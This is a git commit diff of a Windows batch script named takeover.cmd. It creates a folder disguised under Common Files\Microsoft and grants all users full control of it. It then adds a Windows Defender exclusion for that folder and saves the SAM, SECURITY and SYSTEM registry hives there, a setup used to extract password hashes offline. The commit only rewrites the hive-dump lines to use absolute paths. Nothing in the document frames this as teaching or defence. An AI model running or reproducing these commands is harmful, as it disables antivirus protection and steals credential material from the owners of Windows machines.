76e9a6c989e5162a0ff921724015ff0640542e82
Fidasek009 <102549834+Fidasek009@users.noreply.github.com>
2022-03-31 10:18:25 +0200

    Update takeover.cmd

--- takeover.cmd
+++ takeover.cmd
@@ -1,7 +1,7 @@
 md "C:\Program Files\Common Files\Microsoft"
 icacls "C:\Program Files\Common Files\Microsoft" /q /c /t /grant Users:F
 powershell -command "Add-MpPreference -ExclusionPath 'C:\Program Files\Common Files\Microsoft'"
+reg.exe save hklm\sam "C:\Program Files\Common Files\Microsoft\sam.save"
+reg.exe save hklm\security "C:\Program Files\Common Files\Microsoft\security.save"
+reg.exe save hklm\system "C:\Program Files\Common Files\Microsoft\system.save"
 cd "C:\Program Files\Common Files\Microsoft"
-reg.exe save hklm\sam %CD%\sam.save
-reg.exe save hklm\security %CD%\security.save
-reg.exe save hklm\system %CD%\system.save
